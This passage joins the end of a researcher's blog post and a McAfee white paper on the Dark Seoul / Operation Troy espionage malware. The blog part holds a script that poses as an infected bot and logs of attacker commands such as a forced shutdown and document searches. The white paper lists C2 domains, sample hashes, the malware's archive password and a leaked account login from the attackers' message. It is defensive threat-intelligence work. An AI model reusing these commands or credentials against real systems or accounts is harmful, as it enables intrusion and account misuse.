  99.#sock.send('KILLED')    
 100.#  But  I'm  disappointed:    
 101.                                     sock.send('NOOooOOooOOooOOoo  :-­(  I  thought  we  were  friends!')102.                                     break    
 103.                             elif  data  ==  'shell':    
 104.                                     sock.send(cmd)    
 105.                                     sock.send(prompt)    
 106.                                     shell_mode  =  True    
 107.                                     continue    
 108.                             elif  data  ==  'sleep':    
 109.                                     sock.send('BYE  BYE\n')    
 110.111.                             sock.send('$')    
 112.113.     if  __name__  ==  '__main__':    
 114.             if  len(sys.argv)  ==  2:    
 115.                     main(sys.argv[1])    
 116.             else:    
 117.                     main()    
</code>

As you can see, this script simply tries to emulate the basic functionality of ByeBye: it performs the initial check-in and waits for incoming messages from the operator.Yes - since, as previously said, the C&C comes online only at times - I instructed the script to play an extremely loud alarm.Props to my flatmate for waking me up whenever the alarm went off.Surprisingly the operator responded few moments later my first attempt, although he quickly tried to terminate me probably noticing an unexpected origin:

<code>
[+]  Received:  kill
[+]  Received:  kill
[+]  Received:  shell
[+]  Received:  shutdown  /r  /t  0
</code>

Unfortunately at that time I didn't have the script completed, therefore he noticed something odd and closed my connection.I let a few days pass, completed the script and prepared a more credible scenario: a legitimate looking system connecting out of South Asia.This time it took a bit longer to get some response from the operator, who simply tried to search for documents on the system:
<code>
       [+]  Received:  shell
       [+]  Received:  systeminfo
       [+]  Received:  dir  /s  *.pdf
       [+]  Received:  dir  /s  *.doc
       [+]  Received:  exit
       [+]  Received:  sleep
</code>
Sadly no further activity was observed.</section>

<section>
<heading>Conclusions</heading>
This is yet another case of poorly skilled attackers managing to run successful espionage campaigns for extended periods of time.This is probably one of the most basic incidents I encountered so far, but we can safely assume that the operators behind this campaign are successful enough to maintain the operations running for at least the last 6 months, possibly even more.No clear indicator is available to make an informed estimate on what could be the origin of the attacks.</section>

<noncontent>
This work was brought to you by Claudio "nex" Guarnieri, Rapid7 Labs.6940 Views      Tags: malware , targeted , pakistan


  Average User Rating

  (2 ratings)



 0 Comments
 Please
 login
 to
 comment

 There are no comments on this post

Home     |   Top of page   |   Rapid7.com    |   Metasploit.com

</noncontent>
</doc><doc>
<cover>
<noncontent>White Paper</noncontent>
<heading>Dissecting Operation Troy:
Cyberespionage in South Korea</heading>

By Ryan Sherstobitoff and Itai Liba, McAfee® Labs
and James Walter, Office of the CTO
</cover>

<toc>
<heading>Table of Contents</heading>
 Executive Summary	 3

 Attack Timeline	 3

 State Sponsorship or Cyberterrorism?This cyberattack caused a significant amount of damage to the affected organizations by wiping the hard drives of tens of thousands of computers.McAfee Labs research provides further insight into the likely source of these attacks.Though not definitive, our analysis provides a much clearer picture.The research also indicates that there may have been two distinct groups, attacking different targets.Our analysis of this attack—known first as Dark Seoul and now as Operation Troy—has revealed that in addition to the data losses of the MBR wiping, the incident was more than cybervandalism.The attacks on South Korean targets were actually the conclusion of a covert espionage campaign.</section>

<section>

<heading>Attack Timeline</heading>
Our analysis suggests the following order of these attacks.Later in this report we mention other elements that color our view of this event, but consistent throughout is our belief that the attackers had access to the environments prior to launching the wiping component.March 20 attack against banks and news agencies in South Korea:

1.The remote-access Trojan was compiled January 26, 2013.2.The component to wipe the master boot record (MBR) of numerous systems was compiled January 31.3.An initial victim within the organization was spear-phished with the remote-access Trojan.This likely occurred before March 20, and possibly weeks prior to the attack.4.The dropper was compiled March 20, hours before the attack occurred.5.The dropper was distributed to systems across the victim organizations, and within minutes of execution the MBRs were wiped.This occurred around 2:00 pm Seoul time on March 20.</section>

<section>
<heading>State Sponsorship or Cyberterrorism?</heading>
Who conducted these attacks is still unclear, but our research gives some further insight into the likely source.The clues left behind confirm that the two groups claiming responsibility were a fabrication to throw investigators off the trail and to mask the true source.<heading>The adversaries</heading>

The two groups that appear to have been involved in the attacks have had no prior connection until now.•	 NewRomanic Cyber Army Team.The samples connected to this group are more convincing.The majority of the wipers (found in the wild and retrieved from infected systems through other sources) contain the strings “principes” and “hastati,” which also appear in a message left on one of the targeted websites in the form of a web pop-up.The wiper component also overwrote the MBR with one of these strings.The following data points support this fact:
 ––The strings “principes”<fn>1</fn> and “hastati”<fn>2</fn> were found within the code of some of the wiper components.The same strings were also found in the web pop-up message that was left on the Nocut News Korea website.The strings are ancient Roman terms that make reference to military units, hence a “cyberarmy.” The pop-up even states some of the specific units that were part of hastati which were involved in this attack.––The remote-access Trojan that was found had a build path which included the reference “Make Troy,” a subdirectory of the folder “Work.” Troy <fn>3</fn> refers to an ancient Roman region, again connecting the Roman references to this group, which consistently uses this theme.•	 The Whois Hacking Team.On March 20, the website of the network provider LG +U was defaced by this group.Was it a coincidence that a second group was involved?All of the evidence indicates that they had a strong involvement, but there is no solid link to the group because it did not claim involvement in the attacks.However, we do have the circumstantial link of a wiper component that in practice operated differently from the wipers employed by the NewRomanic Cyber Army yet also appears to be essentially the same wiper.The Whois Hacking Team MBR wiper component includes the same graphics (in a resource file in the binary) that appeared on the defaced LG +U website, although the malware did not behave the same way.Within the main executable file, however, we discovered a small portion of the code that matched the structure of that of the NewRomanic Cyber Army wipers we found, so the Whois Team likely dropped the same wiper.State sponsored or not, these attacks were crippling nonetheless.The overall tactics were not that sophisticated in comparison to what we have seen before.The trend seems to be moving toward using the following techniques against targets:

 •	 Stealing and holding data hostage and announcing the theft.Public news media have reported only that tens of thousands of computers had their MBRs wiped by the malware.But there is more to this story: The main group behind the attack claims that a vast amount of personal information has been stolen.This type of tactic is consistent with Anonymous operations and others that fall within the hacktivist category, in which they announce and leak portions of confidential information.•	 Wiping the MBR to render systems unusable, creating an instant slowdown to operations within the target
</section>

<section>
 <heading>The Analysis</heading>
 What were the motives behind these attacks and why did the attackers chose certain targets?The attacks managed to create a significant disruption of ATM networks while denying access to funds.This wasn’t the first time that this type of attack—in which destructive malware wiped the systems belonging to a financial institution—has occurred in South Korea.In 2011 the same financial institution was hit with destructive malware that caused a denial of service.The attackers left a calling card a day after the attacks in the form of a web pop-up message claiming that the NewRomanic Cyber Army Team was responsible and had leaked private information from several banks and media companies.They also referenced destroying the data on a large number of machines (the MBR wiping) and left a message in the web pop-up identifying the group behind the attacks.The page title in Internet Explorer was “Hey, Everybody in Korea????”

 “Hi, Dear Friends, We are very happy to inform you the following news.We, NewRomanic Cyber Army Team, verified our #OPFuckKorea2003.We have now a great deal of personal information in our hands.Those includes; 2.49M of member table data, cms_info more than 50M from .Much information from Bank.We destroyed more than 0.18M of PCs.Many auth Hope you are lucky.11th, 12th, 13th, 21st, 23rd and 27th HASTATI Detachment.Part of PRINCIPES Elements.p.s For more information, please visit www.dropbox.com login with joseph.r.ulatoski@gmail.com::lqaz@WSX3edc$RFV.Please also visit pastebin.com.”
</section>

<section>
 <heading>The Malware</heading>
 A few types of malware were involved in these attacks.Each variant had a particular use.Some public reports mentioned only the use of the wiper component; however, there were actually three components, all with a different purpose, that assisted the attackers in the campaign.Occurred March 20.•	 Remote access to the targets’ environments for a period prior to the attack.The duration of this access is unknown.<heading>The dropper Trojan</heading>
 The dropper Trojan was primarily used to download the executable that destroyed the systems’ MBRs.We suspect that the dropper Trojan was distributed at the time of the attacks via a compromised patch-management server that pretended to run a legitimate update.The dropper Trojan was compiled March 20, the day of the attack and several hours prior to the destruction of the systems.We suspect that the attackers had access to the target environment prior to March 20.It is unlikely that a large volume of users (some 30,000+) were spear-phished on March 20 alone.It’s likely a much earlier compromise led to the attacks’ being staged internally.Thus, there was an initial victim whose infected system allowed the attackers to gain access to other systems that let them distribute the malware broadly.The initial infection certainly could have come from a spear-phishing attack.The backdoor component was compiled in late January.The attackers could have been inside the networks since February.This timeline is plausible given that the attackers claim to have stolen a vast amount of information from these networks prior to wiping the MBRs.Our further analysis led us to discover additional components that support our conclusion:

 •	 A remote-access Trojan was discovered to have compromised some of the target environments, specifically an internal server used to distribute updates to thousands of PCs.This Trojan variant was compiled January 26, and was detected by the security industry on March 25.McAfee detects this threat as RDN/Generic PWS.y!io.This Trojan was built with the Microsoft Visual C++ Version 2.9 compiler with a file size of 47KB.<heading>MBR wiper</heading>
 
 We have seen several wiper samples to date; all were compiled January 31.The wiper itself is relatively small (24KB) and is introduced into the environment via a dropper Trojan that is 418KB and was compiled the day of the attacks.Upon executing the malware, the main dropper (9263e40d9823aecf9388b64de34eae54) creates the file AgentBase.exe, the MBR wiper component.This file is placed in the infected user’s application data folder, executes, and immediately starts the countdown to wipe the system and render it unbootable.This file was compiled approximately two months prior to the attack’s taking place.The main dropper component was compiled the day of the attack, March 20, at 4:07 am Seoul time.The dropper installed the wiper, which destroyed the MBRs at around 2:00 pm Seoul time.Once the dropper executed, the system were wiped within minutes.Thus, these components likely weren’t distributed until the time when the attackers wished to destroy these machines.<heading>The remote-access Trojan</heading>
 
 It’s not widely known that the attackers used a remote-access Trojan to compromise an internal server.The attackers used this internal server to distribute the wiper component to the thousands of PCs.The remote-access Trojan had a file size of 46KB and was compiled on January 26, five days before the MBR wiper was compiled.As we concluded earlier, we have determined that the attackers had access to the environment prior to wiping the systems.The remote-access Trojan was likely delivered to an internal PC via a spear-phishing campaign.From this system the attackers accessed other internal resources.The Trojan was designed to operate within Internet Explorer; it launched a hidden instance of Internet Explorer and injected itself into the running process.<figure><caption>Figure 1.The process monitor shows the remote-access Trojan spawning an instance of Internet Explorer.</caption></figure>

 The Trojan immediately modified the properties in the registry to allow for remote connections to the system.</section>

<section>
 <heading>Linking to the Attackers</heading>
 Linking malware to its developers isn’t always an easy task.Most attackers are careful enough to ensure they can’t be traced.This is especially important in cases such as cyberespionage, in which the intent is to remain invisible.In our analysis we observed a number of unique attributes in the components involved in these attacks; these markers allowed us to link specific samples to a specific group.Two groups have taken credit for these attacks, but we can tell that the variants which wiped the systems link to the NewRomanic Cyber Army Team.Although the Whois Hacking Team is more public due to its defacement of the network provider LG +U’s website, we can link this group to only one sample of a wiper, which operates differently than the others.The Whois wiper is much larger, with a file size of 236KB and was compiled March 19, whereas the other wiper components are a mere 24KB.The larger size suggests the Whois wiper contains more functions.Thus, we can definitively link NewRomanic to the samples used to wipe the MBRs of systems within the South Korean financial institution networks.NewRomanic will remain the prime suspect involved in the attacks.Confirming the link between NewRomanic and known wiper samples, we found a number of wiper samples contained either the string “hastati” or “principes” in the calling cards left by the attacker.<table>
 Sample MD5 Compilation Date Detection Name

 db4bbdc36a78a8807ad9b15a562515c4 January 31, 2013 KillMBR-FBIA

 5fcd6e1dace6b0599429d913850f0364 January 31, 2013 KillMBR-FBIA
 f0e045210e3258dad91d7b6b4d64e7f3 January 31, 2013 KillMBR-FBIA
<caption>Table 2: Wiper samples connected to the NewRomanic Cyber Army Team.</caption>
</table>

 Not only did most of the wiper samples link to NewRomanic, but the remote-access Trojan can also be linked to the group.The Trojan contained a build path that mentions Troy in the directory path, again consistent with the ancient Roman references used by this group.<figure><caption>Figure 2.The remote-access Trojan names Troy.This reference links the attack to the NewRomanic Cyber Army Team.</caption></figure>

</section>

<section>
 <heading>Code Analysis</heading>
 It is highly unusual that two groups claim responsibility for these attacks.No further information has been revealed as to who they are or what their motivations are; this is another reason to suspect that these two groups are the same and are actually fabricated.The supporting evidence comes in the form of code analysis determining the degree of similarity between the samples.The Whois Hacking Team sample was compiled March 19 at 1:57 pm local time and the NewRomanic dropper was compiled March 20 at 4:07 am local time.The attacks on South Korean banks and media and the defacement of LG +U occurred approximately 2:00 pm local time on March 20.McAfee Labs investigated the differences between the two samples at a code level to determine if there were any similarities.In spite of the fact that the wiper component originating from NewRomanic Cyber Army Team was 24KB in size and the component from Whois was 236KB, we did find similarities within the code.The Whois sample is a dropper for a component that closely resembles the one used by the NewRomanic Cyber Army.We found a significant number of matching subroutines and a large number of code segments with only minor differences.These similarities lead us to conclude that the payload code is based upon the same initial code and was embedded into different droppers.Many of the details of this incident have been examined, and most analysts conclude this was an isolated, though clearly coordinated, attack.However, McAfee Labs has found that there was more to the incident than what was widely reported.Our analysis has revealed a covert espionage campaign.Typically this sort of advanced persistent threat (APT) campaign has targeted a number of sectors in various countries, but Operation Troy, as these attacks are now called, targets solely South Korea.From our analysis of unique attributes within the malware samples we have determined that the initial code behind the “Troy” family of Trojans was created in 2010, as was another component that was dropped by the Trojan HTTP Troy.The malware used in these attacks were compiled to specifically target South Korea and used Korean-language resources in the binaries.The malware connected to legitimate Korean domains that were running a bulletin board and sent a specific command to a PHP page to establish an IRC channel and receive commands.<figure>
 Espionage Campaign
 Operation Troy—Domestic Spying Period Dark Seoul

  March 20,
 2009 2010 2011 2012 2013
  2013

 US/South Chang HTTP Troy Http Dr0pper Concealment Troy
 Korean EagleXP Mail Attack Tong MBR Wiper
 Military
 Attacks NSTAR 3Rat Client
  TDrop
 DDoS Attacks 10 Days of Rain Media/Broadcast
 Attacks
  Suspected Link
 Financial Industry Solid Link
 Attacks
  Highly Probable Link
 <caption>Figure 3.The targeted attack Dark Seoul reached its culmination in March 2013, but its roots go back at least to 2009, when the Trojan’s source code was first compiled.Subsequent variations of the malware have also been involved in these threats.</caption>
</figure>

 McAfee Labs has determined that domestic espionage activities occurred before the March 20 attacks, most likely to gain intelligence regarding the targets to carry out further attacks (such as the March 20 incident) or to benefit the attackers in some other ways.This spying operation had remained hidden and only now has been discovered through diligent research and collaboration.We also suspect the attackers had knowledge of the security software running within the environment before they wiped the systems, given that some of the variants used in the attack were made to look as if they were antimalware update files from before March 20.The attackers who conducted the operation remained hidden for a number of years prior to the March 20 incident by using a variety of custom tools.Our investigation into Dark Seoul has found a long-term domestic spying operation underway since at least 2009.The operation, all based on the same code, has attempted to infiltrate specific South Korean targets.We call this Operation Troy, based on the frequent use of the word Troy in the compile path strings in the malware.The prime suspect group in these attacks is the New Romanic Cyber Army Team, which makes frequent use of Roman and classical terms in their code.While analyzing malware components from before the March 20 incident we found both similar and identical attributes of the files involved that enable us to link them to the 3Rat remote administration tool client used on March 20 as well as to samples dating to 2010.Furthermore, we determined that through prior access to the victims’ networks, the attackers were able to upload the MBR wiper component and distribute it.It is also possible that the campaign known as 10 Days of Rain is a byproduct of Operation Troy; some of our analysis suggests that the malware Concealment Troy was present in these attacks.<heading>Tools and tactics</heading>

 NSTAR: 2010–2011

 NSTAR appears to be the first production version of the Troy family.This Trojan is based upon malware created for a military espionage campaign that first emerged in 2009.NSTAR is the first to use components in the same way that later variants of the Troy family do.It included a shared DLL (bs.dll) that was found in the 2010 and 2011 variants.Later variants use a modified version, HTTPSecurityProvider.dll, which employs nearly the same file-mapping function as used by bs.dll.Most of these variants are compiled from the Work directory; that’s fairly consistent throughout all versions.The DLL was compiled using Microsoft Visual C++ Version 6.Those iterations were found in 2010-2011.The call graph generated for NSTAR’s bs.dll is identical with that of HTTP Troy.They were compiled at least a year apart from each other.<figure><caption>Figure 4.Call graph for bs.dll from the NSTAR variant of the Troy Trojan.</caption></figure>

<figure><caption>Figure 5.Call graph for bs.dll from the HTTP Troy variant.</caption></figure>

 The DLL was compiled March 3, 2011, and includes an OCX component that was compiled in late 2010.The OCX used a very different compile path, but bs.dll, the backdoor, is essentially the same as those seen in later versions.The Work directory, with path shown below, is also used with Troy variants Concealment Troy and 3Rat Client, which were both compiled in 2013.<code>
 E:\Work\BackUp\2011\nstar_1103\BackDoor\BsDll-up\Release\BsDll.pdb
</code>

We also found a file-mapping function in this variant similar to those in most of the newer versions.The unique string beginning with “FFFFFFF” is identical and occurs throughout the later variants.<figure><caption>Figure 6.NSTAR’s file-mapping function.</caption></figure>

 The malware establishes an IRC channel to receive real-time commands in the same manner as the military espionage malware.<figure><caption>Figure 7.NSTAR communicates with its control server via HTTP as its primary channel.</caption></figure>

 <heading>Chang and EagleXP: 2010</heading>
 Another variant from 2010, EagleXP, is closely related to NSTAR and HTTP Troy based on reused components.EagleXP used this compile path:

<code>
 D:\VMware\eaglexp(Backup)\eaglexp\vmshare\Work\BsDll-up\Release\BsDll.pdb
</code>
 Again we see the Work directory involved as in the other post-2010 malware used in this campaign.A variant compiled
 May 27, 2010, also contained a very similar compile path.We were able to obtain some traffic from the control server.<code>
 D:\\Chang\\vmshare\\Work\\BsDll-up\\Release\\BsDll.pdb
</code>
 The May 27 variant, called Chang, operated in the same manner as other Troy variants and used the same bs.dll.A Korean
 manufacturing website hosted both the control server and an IRC server.<figure> <caption>Figure 8.Outbound traffic from an infected system.</caption></figure>

<figure> <caption>Figure 9.The malware establishes a channel with the control server via IRC.</caption></figure>


 Both the Chang and EagleXP variants are based on the same code that created NSTAR and later Troy variants.These similarities confirm the attackers have operated for more than three years against South Korean targets.<heading>Inside the IRC botnet</heading>

<figure>
 Troy Botnet
 Sujewha.com Traveler.foxlink.com

 Toneharbor.com  Nowq.net

  Qitaegyo.com Babcom-h1.bluethunder.co
 Dong.a.jp Hanja.edu.com

 HTTP Lawbookcenter.co.kr
 Troy Solarshare.co.kr


 Http
 Dr0pper Delmundo.kr
 Byonshop.com

 Dochang.pe.kr Theumin.net


 Tong Gcglobal.com

 NSTAR

 TDrop
  Apsumo.co.kr


 Concealment
 Troy Mupa.co.kr
</figure>
 <caption>Figure 10.The malware family and its control servers.</caption>


 During our investigation we dug into the attackers’ controlling botnet, which was used until 2013.The infrastructure
 relied upon on a network of hacked South Korean websites hosting IRC servers.The infected clients in turn communicated
 with the IRC servers using RSA encryption and used functions imported from the Microsoft Cryptography API library.<figure> <caption>Figure 11.Some functions imported from the Microsoft Cryptography API.</caption></figure>

The attackers hardcoded the control domains in bs.dll and distributed it in the final compiled Trojan code.Each variant of each generation of Trojans contained different hardcoded strings pertaining to the control servers.This shows that the attackers first compromised the future IRC server sites and then compiled the component and distributed it to infected targets.<figure> <caption>Figure 12.Hardcoded addresses in bs.dll.</caption></figure>

 The nickname for the bot can be determined by the outbound traffic and information written to the Windows registry.One variant operating in June 2010 used the nickname BS^000C2918AB11 with the password wodehaopeng.The malware joined the IRC channel #god and sent several private messages to what was likely the control server to receive instructions.To date we have found only one sample of HTTP Troy.Upon execution the malware launches a crippled GUI that allows the victim to install a screen saver displaying politically sensitive images.We don’t know why the developers took the risk of making the Trojan visible.The screensaver component (chonanship.scr) is not malicious and was compiled on December 12, 2010.It contained images related to the sinking of the South Korean Navy ship Cheonan.<fn>4</fn> HTTP Troy was compiled on March 20, 2011, and contained the compile path Z:\source\1\HttpTroy\BsDll-up\Release\BsDll.pdb.As we can see, HTTP Troy uses the same DLL as the NSTAR, Chang, and EagleXP variants did in 2010.This path was contained in a dropped DLL component that was used to establish a hidden IRC channel to the attackers’ control server.The primary dropper file for this remote-access Trojan was disguised as AhnLab’s Smart Update Utility setup program.The original filename was SUpdate.exe.After executing, the remote-access Trojan makes a connection to sujewha.com, the IRC control server.<figure><caption>Figure 13.HTTP Troy communicates with its control server via IRC.</caption>
</figure>

<heading>Http Dr0pper: 2012</heading>
 We found a second-generation Trojan based on HTTP Troy that included the compile path Z:\1Mission\Team_Project\[2012.6~]\HTTP Troy\HttpDr0pper\Win32\Release.This Trojan, Http Dr0pper, was compiled in 2012 from the HTTP Troy directory, indicating it is an advancement of the original HTTP Troy.All of the variants from this point reuse a specific DLL, which in some instances is named HTTPSecurityProvider.dll and uses the Microsoft Cryptography API to secure communications.We can track the reuse of this DLL based on the consistent file‑mapping function that appears throughout the variants.<figure> <caption>Figure 14.The malware Http Dr0pper using the same file-mapping function and DLL as other versions.</caption></figure>


 We can determine that another variant, Tong (based on the directory in which it was compiled), also reuses this DLL and contains the same function.<figure> <caption>Figure 15.The malware Tong using the same file-mapping function and DLL as other versions.</caption></figure>

 Furthermore, variants such as Concealment Troy that were compiled in 2013 contain the same function once decoded.Still, some of the base code is reused in the supporting DLL for Concealment Troy.<figure> <caption>Figure 16.The malware Concealment Troy using the same function (encoded function shown).</caption></figure>

 After execution the Trojan makes a connection to the control server using specific parameters that include the IRC nickname.This communication pattern is consistent with other variants that reference Troy.<figure><caption> Figure 17.Communicating with the control server.</caption></figure>

 <heading>Tong: 2012</heading>
 The Tong variant contains the compile path E:\Tong\Work\Op\1Mission\Team_Project\[2012.6~]\HTTP Trojan 2.0\HttpDr0pper\Win32\Release.It also communicated using the same methods.This Trojan was compiled on August 28, 2012.<figure> <caption>Figure 18.TDrop uses one of two DLL files, payload32.dll and payload64.dll, and injects one, depending on operating system, into svchost.exe.Previous versions used bs.dll, which contained the code for communicating with the IRC botnet.TDrop has some further functionality not present in HTTP Troy that extends this Trojan’s ability to operate on 64-bit machines and to evade automated analysis systems and emulation technologies.The evasion routines check for the presence of debuggers and tracers that attach to the parent process.This effectively causes the parent process to immediately terminate when under analysis by emulation or sandboxing systems that attempt to hook and monitor API calls coming from that process.<figure><caption>Figure 19.The antidebugging feature in payload32.dll.</caption></figure>

 Furthermore, TDrop uses a DLL to run under nonprivileged accounts on Windows 7.This variant was compiled on January 15, 2013, and contained the compile path D:\Work\Op\Mission\TeamProject\[2012.11~12]\TDrop\Dropper32\Release\Dropper.pdb.The main executable, which extracts the other components, was compiled from the path Z:\Work\v3zip\misc.c and Z:\Work\v3unzip.c.This is likely a compression tool to extract the files to the desktop.Just as Http Dr0pper, TDrop uses the disguised dropper component AhnlabUpdate.exe.The unique code is nearly identical to that used in Http Dr0pper with the exception of the last two characters.<figure><caption>Figure 20.TDrop reusing code from Http Dr0pper.</caption></figure>


When the main Trojan file executes, it launches RunCmd.exe, which itself doesn’t appear to be malicious.RunCmd.exe then launches AhnlabUpdate.exe based on the specified filename in the associated RunCmd.ini file.These files are created in the directory 114719_507_AhnlabUpdateKit, which sits in a temp directory created on the desktop.It is obvious that the attackers were aware of the security product that the target environment used and attempted to make the malware appear as legitimate as possible.AhnlabUpdate drops and runs an additional executable, which is the RAT payload that establishes a connection with the control server.<figure>

 Main.EXE

 RunCmd.exe

 AhnlabUpdate.exe

 ~ERC6C8.tmp
 <caption>Figure 21.TDrop disguises its presence by appearing to be a security product.</caption>
</figure>

 <heading>Concealment Troy: 2013</heading>
 Another third-generation Troy family Trojan is Concealment Troy.This version was compiled from the same directory as the 3Rat client found in the victims’ environments on March 20.Some components from Concealment Troy suggest that the source code was originally written in 2010 and was later compiled for use in this campaign.The 64-bit component to install the backdoor on the victims’ systems contains an interesting compile path and was first created on November 28, 2012.(Concealment Troy is a typical HTTP botnet.)<figure> <caption>Figure 22.Concealment Troy abandons the use of IRC for real-time control and uses HTTP as its primary channel.</caption></figure>

</section>

<section>
 <heading>Military Espionage Malware: 2009–2013</heading>
 McAfee Labs has uncovered a sophisticated military spying network targeting South Korea that has been in operation since 2009.Our analysis shows this network is connected to the Dark Seoul incident.Furthermore, we have also determined that a single group has been behind a series of threats targeting South Korea since October 2009.In this case the adversary had designed a sophisticated encrypted network designed to gather intelligence on military networks.We have confirmed cases of Trojans operating through these networks in 2009, 2010, 2011, and 2013.This network was designed to camouflage all communications between the infected systems and the control servers via the Microsoft Cryptography API using RSA 128-bit encryption.Everything extracted from these military networks would be transmitted over this encrypted network once the malware identified interesting information.What makes this case particularly interesting is the use of automated reconnaissance tools to identify what specific military information internal systems contained before the attackers tried to grab any of the files.<figure>
 August 21, 2010 October 21, 2009
 Military Attacks Military Attacks

 take.chu.jp seung.us sarangbang.us christkingchurch.us

 January 13, 2013  February 28, 2011
 Military Attacks  Military Attacks

 djuna.cine21.com strider.pe.kr dochang.pe.kr kairoshairstory.com.au ejiweb.com dennisoneil.net daeilho.net
 <caption>Figure 23.Encrypted data exfiltration network.</caption>
</figure>

The attacks would have occurred in four general stages:
 •	 Initial compromise via a “watering-hole attack,” which would lead to the exploitation of the internal systems (in the 2009 case).(The attacker placed a zero-day exploit on a military social networking site.)Later cases were likely spear phishing to more quickly get to the right targets.•	 Malwareautomatically performs recon on target systems looking for documents of interest.Malware can also scrape out passwords and registry information along with directory listing of interesting files.•	 The attacker can request directory contents from infected systems based on the number of interesting files found.Can selectively grab specific files as needed.•	 Stolen files are transmitted via HTTP-encrypted channel to the attacker’s server.<heading>The encrypted network</heading>
 The attacker’s encrypted network uses Microsoft’s Cryptography API library Version 1.0 to encrypt communication channels to the control servers over both HTTP and IRC.The encryption uses a 128-bit RSA key, shown as imported and used by the following code.<figure> <caption>Figure 24.Function to call the Cryptography API library.</caption></figure>

<figure><caption>Figure 25.RSA encryption key used to camouflage communications.</caption></figure>

 This network operates over both HTTP and uses IRC as secondary channel for real-time operations.The IRC network is based on the open-source library libircclient<fn>5</fn> and everything sent over this IRC channel is encrypted via the Cryptography API.<figure> <caption>Figure 26.Establishing an IRC channel session.</caption></figure>

 The following commands are supported by IRC to control infected systems in real time.This functionality enables the attacker to send and receive files on demand and execute remote commands.The messages sent between client and servers are base64 encoded and then encrypted using the Cryptography API; thus a message must be decoded and decrypted to be visible.This highly sophisticated method provides for great flexibility over a secure encrypted channel that is not SSL.•	 Get bot version and uptime
 •	 Get directory file listing, all drives or from specific path
 •	 Stop activities for a given period
 •	 Download file
 •	 Send local file to the server
 •	 Execute shell command
 •	 Connect to IRC server
 •	 Change nick (IRC)
 •	 Join channel (IRC)
 •	 IRC disconnect
 •	 Remove bot from system

<figure><caption>Figure 27.Functions for IRC commands.</caption></figure>

 The HTTP portion is designed to get configuration data used in the IRC botnet and to send stolen documents back to the control server.<figure> <caption>Figure 28.HTTP Get command with parameters.</caption></figure>

<figure><caption>Figure 29.HTTP Get command continued.</caption></figure>

<figure> <caption>Figure 30.HTTP Get command continued.</caption></figure>

The encrypted network operates by scanning infected systems and categorizing those systems that contain interesting documents.The malware does not extract every document that is found as a match through drive scanning; rather it assigns a unique signature to the infected system according to what it contains.Less interesting systems are less likely to have documents extracted from them.The directory contents are uploaded to the attacker’s server, which lets the attacker grab documents at will and keeps the amount of network traffic low.<heading>Data exfiltration</heading>
 The theft of classified information is the primary purpose of this network and would occur through drive scanning.Drive scanning locates classified information on target systems and gives the attacker an overall idea of what these military networks have.The malware searches the root disk, counts the number of interesting files, and determines the level of that system’s importance to the attacker.The search criteria are primarily specific file extensions and keywords in document titles.The keywords are all military specific.Some refer to specific military units and programs that operate in South Korea.This function would determine only the number of interesting files that are contained on any given system; another function would extract the list of files that match these search criteria.<figure> <caption>Figure 31.The drive scan function.</caption></figure>

In addition to searching for English keywords, the function searches for Korean ASCII characters that represent a subset of military terms.Most keywords specific to military operations in South Korea are in English.There is also a set of abbreviations.<figure> <caption>Figure 32.Google translation of ASCII characters.</caption></figure>

The files to be sent to the attacker’s server are zipped using the open-source Zip Utils.<fn>6</fn> The component uses the password “dkwero38oerA^t@#.” We have consistently found this password in the malware dating back to 2009.It is used primarily to archive items to be stolen from infected systems.<figure> <caption>Figure 33.The function to zip stolen documents.</caption></figure>

 <heading>The DLL relationship</heading>
 
 In all of these threats we have seen the consistent use of bs.dll, a stripped down version of ip6ld.dll, which we have found in the military espionage cases.We can connect not only similar functions within bs.dll from 2011 to date with those of the military cases in 2009 and 2010, but also the shared encryption key for zipping classified information to be sent to the control server.This ip6ld.dll is the same as another file, ~81923.dll; both operate in the same manner.Bs.dll appears to be used primarily
 for IRC botnet communications.The component bs.dll has been seen in a number of Troy-era malware samples: Chang, EagleXP, NSTAR, Mail Attack, HTTP Troy, Tong, Http Dr0pper, etc.The file Ip6ld.dll, which contains much of the logic described in these attacks, shares a number of common functions with bs.dll, including the zip encryption password.In addition, the IRC and encryption functions are the same in both files, indicating they were built by the same individual or group.The two functions are likely the same source code in different versions.The primary difference between them is bs.dll’s lack of searching for specific extensions and terms that Ip6ld.dll and ~81923.dll contain.This suggests bs.dll requires a second module and we have seen that with the Mail Attack variant, compiled in February 2011, which contained both bs.dll and payload.dll, with the latter containing the military-specific search and extraction functions.<figure><caption>Figure 34.The bs.dll function to scan all drives based on a specified extension.</caption></figure>

 The following function found in bs.dll lists the contents of specified directories and zips those contents into an archive file with a password.This function doesn’t have any criteria and is likely disabled in some cases, such as with HTTP Troy, which downloads a payload module to search for data.<figure> <caption>Figure 35.A bs.dll function to list and send directory contents.</caption></figure>

<figure> <caption>Figure 36.A bs.dll function to send directory contents to remote server.</caption></figure>

 Payload.dll appears to combine both drive searching and directory listing into a single function.A separate action puts the directory contents into a separate file and prepares it to be sent to the remote server.<figure> <caption>Figure 37.A payload.dll drive-search function.</caption></figure>

<figure><caption>Figure 38.A function to zip contents.</caption></figure>


<heading>Relationships to Http Dr0pper</heading>

 We have determined that some variants of Http Dr0pper will execute payload32.dll, which is essentially the same DLL that is found in TDrop.This component contains military keywords.One variant of Http Dr0pper made use of payload32.dll, which was compiled on August 23, 2012.The TDrop version was compiled January 13, 2013.This consistency confirms further that the operations against South Korea are primarily focused on military intelligence gathering and have attempted to break in since 2009.<heading>Destroying the target</heading>
 
 The espionage malware has the capability to destroy systems in the same way that the March 20, 2013, attacks disabled thousands of systems in South Korea.This capability could be devastating if military networks were to suddenly be wiped after an adversary had gathered intelligence.This was clearly the case with the March 20 Dark Seoul incident, in which we confirmed that the 3Rat Trojan gained access prior to the MBR-wiping event.There was at least one limitation, however: We found the malware of February 2011 could wipe its targets only if it detected that it was being debugged or analyzed by a security product.<figure> <caption>Figure 39.The malware’s function to wipe the MBR.</caption></figure>


<heading>The campaigns</heading>
 Through our research we have discovered a number of distinct subcampaigns as part of the overall Operation Troy, which has targeted military forces in South Korea to extract classified information.These operations were designed to occur in 2009 through 2013.Recently we uncovered evidence to suggest that they continued just prior to Dark Seoul.We can link the actor(s) responsible for Dark Seoul to these particular espionage campaigns through various technical means.•	 The Troy-era malware is based on the same source code to create these specialized versions (components shared over the years).•	 The zip encryption password is found in almost all instances, with the exception of Concealment Troy.•	 Consistent terms in the malware compile paths (for example, Troy, Work, etc.).•	 The same IRC botnet channel and encryption method are used throughout the variants.•	 Military keywords are consistently found through the components spanning 2009–2013, confirming the intent of this adversary.•	 Use of the same string-obfuscation techniques in the 2009–2010 campaigns and the 2012–2013 campaigns.<figure>
